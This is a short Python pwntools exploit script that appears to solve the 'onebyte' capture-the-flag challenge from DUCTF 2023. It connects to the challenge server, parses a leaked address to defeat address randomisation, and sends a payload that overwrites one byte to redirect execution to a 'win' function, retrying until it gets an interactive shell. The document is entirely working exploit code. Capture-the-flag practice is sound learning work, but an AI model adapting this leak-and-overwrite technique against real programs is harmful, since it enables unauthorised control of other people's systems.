from pwn import *
elf = context.binary = ELF("./onebyte")

while(1):
    try:
        r = remote("2023.ductf.dev", 30018)
        r.recvuntil(b"junk: ")
        init = int(r.recvline(),16)
        elf.address = init - 0x11bd
        log.success(f"ELF leak: {hex(elf.address)}")

        payload = p32(elf.sym["win"]) * 4 + b"\xc4"
        r.sendafter(b"Your turn:",payload) 
        r.interactive()
    except:
        r.close()